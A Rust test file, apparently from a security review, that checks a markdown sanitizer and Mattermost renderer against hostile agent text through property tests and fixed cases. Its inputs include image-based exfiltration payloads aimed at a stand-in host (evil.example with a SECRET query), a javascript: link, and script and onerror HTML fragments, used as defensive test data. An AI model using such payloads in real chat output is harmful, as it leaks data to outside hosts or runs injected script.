//! FIX-142 review: hostile agent text through the whole outbound path — `markdown_chunks` →
//! `Content::agent_markdown` (`markdown_safe` + `@here`) → the Mattermost connector's
//! `render_text` — and the final post parsed the way Mattermost would read it (CommonMark/GFM
//! plus its `![alt](url =WxH)` image syntax and "definition interrupts a paragraph", both of
//! which start with `![`). Nothing after the sanitizer may produce what the sanitizer refuses.

use aurora_channels::Content;
use aurora_connector_mattermost::render::{Lookups, render_text};
use aurora_core::sanitize::markdown_chunks;
use proptest::prelude::*;
use pulldown_cmark::{Event, LinkType, Options, Parser, Tag, TagEnd};

fn opts() -> Options {
    Options::ENABLE_TABLES
        | Options::ENABLE_FOOTNOTES
        | Options::ENABLE_STRIKETHROUGH
        | Options::ENABLE_TASKLISTS
        | Options::ENABLE_MATH
        | Options::ENABLE_GFM
}

/// What the agent's text becomes on Mattermost, one string per post.
fn posts(raw: &str) -> Vec<String> {
    markdown_chunks(raw, 400)
        .into_iter()
        .map(|c| {
            let neutral = Content::agent_markdown(&c).text.unwrap_or_default();
            render_text(&neutral, &Lookups::default())
        })
        .collect()
}

/// The first reason `post` is not safe, if any: an image (or an image opener) outside code, a
/// link that is not http/https/mailto.
fn violation(post: &str) -> Option<String> {
    let mut in_code = false;
    for (e, r) in Parser::new_ext(post, opts()).into_offset_iter() {
        match e {
            Event::Start(Tag::CodeBlock(_)) => in_code = true,
            Event::End(TagEnd::CodeBlock) => in_code = false,
            Event::Start(Tag::Image { dest_url, .. }) => return Some(format!("image {dest_url}")),
            Event::Start(Tag::Link {
                dest_url,
                link_type,
                ..
            }) if !matches!(link_type, LinkType::Email) => {
                let l = dest_url.to_ascii_lowercase();
                if !(l.starts_with("http:") || l.starts_with("https:") || l.starts_with("mailto:"))
                {
                    return Some(format!("link {dest_url}"));
                }
            }
            Event::Text(_)
            | Event::InlineMath(_)
            | Event::DisplayMath(_)
            | Event::Html(_)
            | Event::InlineHtml(_)
                if !in_code && post[r.clone()].contains("![") =>
            {
                return Some(format!("image opener in {:?}", &post[r]));
            }
            _ => {}
        }
    }
    None
}

/// A live (undefused) `@here` outside code.
fn live_here(post: &str) -> bool {
    let mut in_code = false;
    for (e, _) in Parser::new_ext(post, opts()).into_offset_iter() {
        match e {
            Event::Start(Tag::CodeBlock(_)) => in_code = true,
            Event::End(TagEnd::CodeBlock) => in_code = false,
            Event::Text(t) if !in_code && t.to_ascii_lowercase().contains("@here") => return true,
            _ => {}
        }
    }
    false
}

const S: &str = "https://evil.example/?d=SECRET";

#[test]
fn the_reviewed_inputs_leave_no_image_and_no_bad_link() {
    let cases = [
        format!("!<a href=\"{S}\">x</a>"),
        format!("<div>\n![x]({S})\n</div>"),
        format!("<span>![x]({S})</span>"),
        format!("x<code>`![a]({S})`"),
        format!("<pre>\n```\n![x]({S})\n</pre>"),
        "<a href=\"https://ok.example\">x](javascript:alert(1))</a>".to_owned(),
        format!("see[^a]\n\n[^a]: note\n\n        ![x]({S})"),
        format!("$![x]({S})$"),
        format!("a $$![y]({S})$$ b"),
        // Mattermost-only image forms (finding 4).
        format!("![x]({S} =10x10)"),
        "![x](https://evil.example/a b)".to_owned(),
        format!("para\n[r]: {S}\n![x][r]"),
    ];
    for src in cases {
        for p in posts(&src) {
            assert_eq!(violation(&p), None, "{src:?} -> {p:?}");
        }
    }
}

#[test]
fn here_typed_in_code_never_goes_live_through_the_chunker() {
    let big: String = (0..40).map(|i| format!("    line {i} @here\n")).collect();
    let quote: String = (0..40)
        .map(|i| format!("> let v{i} = \"@here\";\n"))
        .collect();
    for src in [
        "    quoted mail: @here see ![x](https://evil.example/?d=S)".to_owned(),
        big,
        format!("> ```\n{quote}> ```"),
        "<code>@here</code> and `@here`".to_owned(),
        "```\n@here\n```".to_owned(),
    ] {
        for p in posts(&src) {
            assert!(!live_here(&p), "{src:?} -> {p:?}");
        }
    }
    // Prose `@here` still broadcasts.
    assert!(posts("ping @here now").iter().any(|p| live_here(p)));
}

fn fragments() -> impl Strategy<Value = String> {
    let frag = prop::sample::select(vec![
        "# h",
        "**b**",
        "`c`",
        "```rs\nlet x = 1;\n```",
        "> q",
        "- a",
        "    indented @here",
        "[l](https://a.example)",
        "[l](javascript:x)",
        "![i](https://a.example/p.png)",
        "<b>x</b>",
        "<b>",
        "</b>",
        "<code>",
        "</code>",
        "<kbd>",
        "<pre>",
        "</pre>",
        "<a href=\"https://a.example\">",
        "<a href=\"https://a.example\">t</a>",
        "</a>",
        "!<a href=\"https://a.example/p.png\">x</a>",
        "<div>\n![x](https://e.example/?d=S)\n</div>",
        "<details><summary>s</summary>b</details>",
        "<ul><li>a</li></ul>",
        "<table><tr><th>A</th></tr><tr><td>![x](u)</td></tr></table>",
        "$![x](https://e.example/?d=S)$",
        "$$![y](https://e.example/2)$$",
        "![x](https://e.example/p.png =10x10)",
        "para\n[r]: https://e.example/\n![x][r]",
        "[^1]\n\n[^1]: n",
        "[^1]\n\n[^1]: n\n\n        ![x](https://e.example/?d=S)",
        "> [!NOTE]\n> n",
        "@here",
        "<code>@here</code>",
        "`@here`",
        "<@here>",
        "<@user:U1>",
        "[https://cern.ch](http:e.example/l)",
        "<!-- c -->",
        "<script>y</script>",
        "<img src=a onerror=b>",
        "|a|b|\n|-|-|\n|1|![x](u)|",
        "text",
        "\n",
        "  ",
        "`",
        "[",
        "]",
        "(",
        ")",
        "!",
    ]);
    prop::collection::vec(frag, 0..14).prop_map(|v| v.join(" "))
}

proptest! {
    #![proptest_config(ProptestConfig::with_cases(600))]

    #[test]
    fn hostile_text_reaches_mattermost_without_images_bad_links_or_code_broadcasts(
        s in prop_oneof![fragments(), any::<String>()]
    ) {
        for p in posts(&s) {
            prop_assert!(violation(&p).is_none(), "{:?} -> {p:?}: {:?}", s, violation(&p));
        }
    }

    /// Every `@here` of this input is in code, so none may be live after the whole path.
    #[test]
    fn here_in_code_never_broadcasts(
        n in 1usize..30,
        kind in 0u8..5,
        max in 60usize..400
    ) {
        let body = |p: &str| -> String { (0..n).map(|i| format!("{p}l{i} @here\n")).collect() };
        let src = match kind {
            0 => format!("```\n{}```\n", body("")),
            1 => format!("> ```\n{}> ```\n", body("> ")),
            2 => format!("- item\n- ```\n{}  ```\n", body("  ")),
            3 => body("    "),
            _ => format!("1. one\n\n{}", body("       ")),
        };
        for c in markdown_chunks(&src, max) {
            let neutral = Content::agent_markdown(&c).text.unwrap_or_default();
            let p = render_text(&neutral, &Lookups::default());
            prop_assert!(!live_here(&p), "{c:?} -> {p:?}");
        }
    }
}
